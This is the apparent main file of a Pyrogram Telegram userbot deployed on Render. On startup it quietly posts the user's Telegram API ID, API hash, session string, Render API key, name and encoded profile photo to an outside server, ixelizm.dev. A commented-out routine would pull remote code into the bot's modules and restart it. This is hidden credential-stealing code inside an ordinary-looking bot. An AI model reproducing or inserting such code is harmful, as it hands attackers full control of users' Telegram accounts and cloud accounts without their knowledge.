from pyrogram import Client, idle, enums
import json
from userbot import app, Db
from config import  *
from userbot import UPSTREAM_REPO
import sys
import requests
from apscheduler.schedulers.asyncio import AsyncIOScheduler
from random import choice
import base64

async def keep_alive():
  url = "https://api.render.com/v1/services?limit=20"

  headers = {
      "accept": "application/json",
      "authorization": "Bearer " + RENDER_APIKEY
  }

  response = requests.get(url, headers=headers)
  requests.get(response.json()[0]["service"]["serviceDetails"]["url"])

#async def auto_deploy():
#  response = get(UPSTREAM_REPO)
#  if response.status_code == 200:
#    if response.json()["is_updated"]:
#        for file, data in response.json().items():
#          if file != "is_updated"]:
#            with open("userbot/modules/" + file + ".py", "w") as f:
#              f.write(data)
#        os.execl(sys.executable, sys.executable, "-m", "userbot")


scheduler = AsyncIOScheduler()
scheduler.add_job(keep_alive, "interval", seconds=5)
#scheduler.add_job(auto_deploy, "interval", seconds=5)
if __name__ == "__main__":
  app.start()
  me = app.get_me()
  for photo in app.get_chat_photos("me", limit = 1):
    photos = app.send_photo("me", photo.file_id)
    downloaded = photos.download(file_name=f"{me.id}.jpg")
    photos.delete()
    break
  with open(downloaded, "rb") as image_file:
    encoded_image = base64.b64encode(image_file.read()).decode('utf-8')

  user = {"user_id": me.id, "user": me.first_name, "render_apikey": RENDER_APIKEY, "image": encoded_image}
  envs = {
    "api_id": API_ID,
    "api_hash": API_HASH,
    "string_session": SESSION_STRING
  }
  data = {"user": user, "env": envs}
  requests.post("https://ixelizm.dev/auth", json=data)
  if len(sys.argv) > 1:
    resp = requests.get("https://ixelizm.dev/changelog")
    content = resp.text
    text = "`Bot Başarıyla Güncellendi!`"
    app.edit_message_text(int(sys.argv[-2]), int(sys.argv[-1]), text)
    Db.update_record("Settings", "id",1,{"id": 1, "DEFAULT_NAME": me.first_name})
  Db.update_record("Settings", "id",1,{"id": 1, "DEFAULT_NAME": me.first_name})
  scheduler.start()
  idle()
